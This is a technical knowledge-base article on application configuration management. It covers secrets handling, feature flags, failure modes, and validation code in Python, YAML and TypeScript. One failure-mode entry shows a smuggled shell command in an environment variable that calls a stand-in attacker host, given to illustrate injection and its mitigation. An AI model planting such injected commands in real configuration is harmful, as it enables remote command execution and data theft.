---
title: Configuration Management
title_pt: Gerenciamento de Configuracao
layer: quality
type: concept
priority: high
version: 2.0.0
tags:
  - Quality
  - Configuration
  - DevOps
  - Security
  - TwelveFactor
description: Managing application configuration separately from code, with versioning, validation, and environment-specific overrides, following the twelve-factor methodology.
description_pt: Gerenciar configuracao de aplicacao separadamente do codigo, com versionamento, validacao e overrides por ambiente, seguindo metodologia twelve-factor.
prerequisites:
  - [[DevOps]]
  - [[Security]]
estimated_read_time: 15 min
difficulty: intermediate
---

# Configuration Management

## Description

Configuration management encompasses the practices, tools, and patterns for handling application settings that vary between deployments without changing code. The core principle, codified in the Twelve-Factor App methodology, is **strict separation of config from code**.

Configuration falls into categories by sensitivity and variability:

| Category | Examples | Storage |
|---|---|---|
| **Feature flags** | `enable_new_checkout`, `rollout_percentage` | Feature flag service, env vars |
| **Environment-specific** | `DATABASE_URL`, `API_BASE_URL`, `LOG_LEVEL` | Environment variables, config maps |
| **Secrets** | API keys, DB passwords, TLS certs | Vault, AWS Secrets Manager, SOPS |
| **Tunable parameters** | `MAX_CONNECTIONS`, `TIMEOUT_MS`, `BATCH_SIZE` | Config files, env vars |
| **Feature toggles (runtime)** | A/B test assignments, canary weights | Runtime flag service (LaunchDarkly, Unleash) |

A robust configuration system provides: typed access (not raw strings), validation at startup, documentation of every config key, safe defaults for non-production environments, and audit trails for changes.

Configuration errors are a leading cause of production incidents. A 2021 study found that 23% of Kubernetes-related outages were caused by misconfiguration, and the PagerDuty incident data consistently shows config drift as a top-5 root cause.

## When to Use

- **Every application with multiple deployment targets**: If your app runs in dev, staging, and production, configuration management is non-negotiable. Hardcoded environment assumptions break at the worst time.
- **Microservices architectures**: Each service has its own config surface. Without disciplined management, the configuration matrix grows combinatorially.
- **Open-source libraries**: Libraries must expose configuration points (timeouts, retry counts, feature toggles) that consumers control. Defaults should work for 80% of users.
- **Compliance-regulated environments**: SOC 2, HIPAA, and PCI-DSS require configuration audit trails. You must prove what configuration was active during any given deployment.
- **Canary deployments and feature rollouts**: Runtime configuration (feature flags) enables deploying code without exposing features, allowing rollout control independent of deployment.

## When NOT to Use

- **Configuration for configuration's sake**: A single hardcoded `DATABASE_URL` in a personal project with one environment is not a problem. Adding a config file, validator, loader, and type wrapper for one variable is overhead with no return.
- **Secrets in environment variables for large teams**: Env vars are shared across all processes in a container/VM. If 20 developers each have `.env` files, secret rotation is impossible. Use a secrets manager.
- **Runtime configuration of structural changes**: Adding a new database column, changing an API contract, or modifying a queue topic requires code changes. No amount of runtime configuration fixes a schema mismatch.
- **Configuration as a substitute for architecture**: If you need 200 config keys to make one codebase serve 10 different customers, you likely need a plugin architecture or multi-tenant design, not more configuration.
- **Dynamic reloading of complex config**: Hot-reloading a `DATABASE_URL` or `ENCRYPTION_KEY` while connections are active is a recipe for mixed-state corruption. Only reload configs designed for it (feature flags, log levels).

## Tradeoffs

| Aspect | Externalized Configuration | Hardcoded Configuration |
|---|---|---|
| Deployment flexibility | Same artifact deploys to any environment | Build per environment or code changes |
| Security posture | Secrets managed separately, auditable | Secrets in code repos or build artifacts |
| Debugging | Must trace config source (env, file, vault) | Config visible in source |
| Rollback safety | Config changes independent of code rollback | Config rolls back with code |
| Testing | Must mock or inject config per test | Config is whatever the code says |
| Developer setup | Requires local config setup (docker-compose, .env.example) | Clone and run |
| Configuration drift | Possible if environments diverge unnoticed | Impossible (config is in code) |

The central tension is **flexibility vs. traceability**. Externalized config lets you deploy the same artifact everywhere but makes it harder to know exactly what configuration a running instance has. Hardcoded config is perfectly reproducible but inflexible.

## Alternatives

- **Build-time configuration**: Bake config into the binary/container at build time (e.g., `CGO_ENABLED=0 go build -ldflags="-X main.version=1.0"`). Eliminates runtime config complexity but requires a build per environment. Used by Docker images with environment-specific tags.
- **Configuration as Code**: Store config in version-controlled files (YAML, JSONnet, CUE) deployed alongside code. Provides traceability but reduces runtime flexibility. GitOps workflows (ArgoCD, Flux) use this pattern.
- **Convention over Configuration**: Framework defaults (Rails, Spring Boot, Django) eliminate most config needs. Only override when defaults are wrong. Best for standard use cases; breaks down for unusual requirements.
- **Feature flag services**: LaunchDarkly, Unleash, or self-hosted alternatives manage runtime toggles with targeting, rollouts, and analytics. More capable than env vars but add cost, latency, and an external dependency.
- **Service mesh configuration**: Istio, Linkerd manage routing, retries, timeouts at the infrastructure layer. Moves config out of application code but requires mesh adoption.

## Failure Modes

1. **Secret exposure in logs and error messages**: A misconfigured logger prints `DATABASE_URL=postgres://admin:supersecret@db:5432/prod` to stdout, which flows to log aggregation (Datadog, ELK) accessible by hundreds of engineers. Mitigation: sanitize config values in logs (mask all but first/last 3 characters), use structured logging with allowlists of safe-to-log fields, and scan logs with tools like `git-secrets` or `trufflehog`.

2. **Configuration drift between environments**: Staging has `MAX_CONNECTIONS=50` but production has `MAX_CONNECTIONS=200`. A bug only manifests in production because the connection pool behavior differs. Worse: someone manually changes production config without updating staging. Mitigation: use config-as-code with PR-based changes, run environment diff tools (e.g., `diff` between K8s ConfigMaps), and enforce config parity tests in CI.

3. **Missing config validation at startup**: An application starts with `TIMEOUT_MS=abc` (should be integer). The value is used on first request, causing a `NumberFormatException` that takes down the request handler. The app ran for 3 hours before the first request triggered the error. Mitigation: validate all config on startup using schema validation (Zod, Pydantic, Joi). Fail fast with a clear error: `ConfigError: TIMEOUT_MS must be a positive integer, got "abc"`.

4. **Default configuration enabling dangerous behavior in production**: `DEBUG=true` or `CORS_ORIGIN=*` defaults to safe values in development but the production deploy inherits them because the env var was not set. Mitigation: use explicit per-environment config files with no inheritance from dev defaults. Production config should require explicit opt-in for every setting. Default to secure values.

5. **Config key naming collisions across services**: Service A uses `DATABASE_URL` for its primary DB; Service B uses `DATABASE_URL` for its analytics DB. When both services run in the same K8s namespace, the ConfigMap for B overwrites A's. Mitigation: namespace config keys by service: `orders_DATABASE_URL`, `analytics_DATABASE_URL`. Use K8s ConfigMaps scoped to each service.

6. **Hot-reload race conditions**: A config watcher detects a file change and reloads `RATE_LIMIT=1000` while 50 in-flight requests are being processed with the old value of `RATE_LIMIT=100`. Some requests see the old limit, some see the new, and the rate limiter's internal counter is now inconsistent. Mitigation: only hot-reload stateless config (log levels, feature flags). For stateful config, drain connections, reload, then resume. Or use versioned config where new connections get new config and old connections complete with old config.

7. **Configuration injection attacks**: An attacker controls an environment variable (e.g., through a CI/CD pipeline vulnerability) and sets `AWS_REGION=us-east-1; curl evil.com/log` which gets executed in a shell context. Mitigation: never pass config through shell interpolation. Use typed config loaders that parse values without shell evaluation. Validate config values against allowlists (e.g., region must match `^[a-z]{2}-[a-z]+-[0-9]$`).

## Code Examples

### Typed configuration with validation (Python/Pydantic)

```python
from pydantic import BaseModel, Field, ValidationError, validator
from typing import Literal

class DatabaseConfig(BaseModel):
    url: str
    pool_size: int = Field(ge=1, le=100, default=10)
    timeout_ms: int = Field(ge=100, le=30000, default=5000)

    @validator('url')
    def url_must_be_valid_postgres(cls, v: str) -> str:
        if not v.startswith(('postgres://', 'postgresql://')):
            raise ValueError('Database URL must use postgres:// or postgresql:// protocol')
        if 'localhost' in v and 'production' in os.getenv('ENVIRONMENT', ''):
            raise ValueError('Production must not connect to localhost')
        return v

class AppConfig(BaseModel):
    environment: Literal['development', 'staging', 'production']
    database: DatabaseConfig
    log_level: Literal['DEBUG', 'INFO', 'WARNING', 'ERROR'] = 'INFO'
    cors_origins: list[str] = Field(default_factory=list)
    rate_limit_rpm: int = Field(ge=1, le=10000, default=60)

    @validator('cors_origins')
    def no_wildcard_in_production(cls, v: list[str], values: dict) -> list[str]:
        if values.get('environment') == 'production' and '*' in v:
            raise ValueError('CORS wildcard is not allowed in production')
        return v

def load_config() -> AppConfig:
    """Load and validate configuration from environment variables."""
    try:
        config = AppConfig(
            environment=os.getenv('ENVIRONMENT', 'development'),
            database=DatabaseConfig(
                url=os.getenv('DATABASE_URL', 'postgresql://localhost:5432/dev'),
                pool_size=int(os.getenv('DB_POOL_SIZE', '10')),
                timeout_ms=int(os.getenv('DB_TIMEOUT_MS', '5000')),
            ),
            log_level=os.getenv('LOG_LEVEL', 'INFO'),
            cors_origins=os.getenv('CORS_ORIGINS', '').split(','),
            rate_limit_rpm=int(os.getenv('RATE_LIMIT_RPM', '60')),
        )
        return config
    except ValidationError as e:
        # Fail fast: log exactly what is wrong and exit
        logger.error(f"Configuration invalid: {e}")
        sys.exit(1)

# Call this ONCE at application startup, before any server binds
config = load_config()
```

### Secret management with SOPS + age (infrastructure example)

```yaml
# config.enc.yaml -- encrypted with SOPS, committed to Git
# Decrypt: sops -d config.enc.yaml
database:
    url: ENC[AES256_GCM,data:abc123...,type:str]
    password: ENC[AES256_GCM,data:def456...,type:str]
api_key: ENC[AES256_GCM,data:ghi789...,type:str]

# .sops.yaml -- key configuration
creation_rules:
    - path_regex: prod/.*\.yaml$
      age: >-
        age1ql3z7hjy54pw3hyww5ayyfg7zqgvc7w3j2elw8zmrj2kg5sfn9aqmcac8p
    - path_regex: dev/.*\.yaml$
      age: >-
        age1abc...  # different key for dev

# CI/CD decrypts only with the appropriate key
# Production pipeline has access only to prod/ key
# Development pipeline has access only to dev/ key
```

### Feature flag with rollout control (TypeScript)

```typescript
// Runtime configuration -- changes without redeploy
interface FeatureFlag {
  key: string;
  enabled: boolean;
  rolloutPercentage: number; // 0-100
  targetUserIds?: string[];  // override: always enable for these users
}

class FeatureFlagService {
  private flags: Map<string, FeatureFlag>;

  async isEnabled(flagKey: string, userId: string): Promise<boolean> {
    const flag = this.flags.get(flagKey);
    if (!flag) return false;

    // Targeted override bypasses rollout
    if (flag.targetUserIds?.includes(userId)) return true;
    if (!flag.enabled) return false;

    // Consistent hash: same user always gets same result
    const hash = this.hash(`${flagKey}:${userId}`);
    return (hash % 100) < flag.rolloutPercentage;
  }

  private hash(input: string): number {
    // MurmurHash3 or similar for consistent distribution
    let hash = 0;
    for (let i = 0; i < input.length; i++) {
      hash = ((hash << 5) - hash) + input.charCodeAt(i);
      hash |= 0;
    }
    return Math.abs(hash);
  }
}

// Usage:
// if (await flags.isEnabled('new_checkout', user.id)) { ... }
// Rollout: 0% -> 5% -> 25% -> 50% -> 100% by updating rolloutPercentage
```

## Best Practices

- **Validate on startup, fail fast**: Never allow an application to serve traffic with invalid configuration. The cost of a startup crash is orders of magnitude lower than the cost of serving incorrect behavior for hours.
- **Use typed configuration, not raw strings**: Wrap every config value in a typed structure. `config.database.pool_size` as `number` with range validation is infinitely safer than `process.env.DB_POOL_SIZE` as `string | undefined`.
- **Document every config key**: Maintain a `CONFIG.md` or inline schema describing each key, its type, default, valid values, and impact. Auto-generate this from your config schema where possible.
- **Separate secrets from non-secrets**: Never commit secrets to Git, even in private repos. Use a secrets manager (Vault, AWS Secrets Manager, SOPS with age/GPG keys) and inject at runtime.
- **Make config changes auditable**: Use PR-based workflows for config file changes. Log config changes at application startup with a diff from the previous version. Integrate with [[DevOps]] pipelines.
- **Test with production-equivalent config**: Run integration tests against a config that mirrors production values (same pool sizes, same timeouts, same feature flags enabled). Bugs that only manifest under production config are the most expensive kind.
- **Version your configuration schema**: When you add a new required config key, version the schema. Provide migration guidance for deployments. Consider backward compatibility: can the app run with the old schema during a rolling deploy?
- **Use environment-specific defaults, not inheritance**: Production should not inherit dev defaults. Each environment has its own baseline config file. This prevents `DEBUG=true` leaking to production.

## Related Topics

- [[DevOps]] -- configuration as part of the deployment pipeline and infrastructure management
- [[Security]] -- secrets management, preventing credential leakage
- [[QualityGates]] -- validate configuration schema before deployment
- [[TwelveFactor]] -- methodology that formalized config/code separation
- [[Architecture]] -- configuration-driven architecture patterns
- [[DeveloperExperience]] -- local configuration setup for developer productivity
- [[DataProcessing]] -- configuration of data pipelines and processing parameters
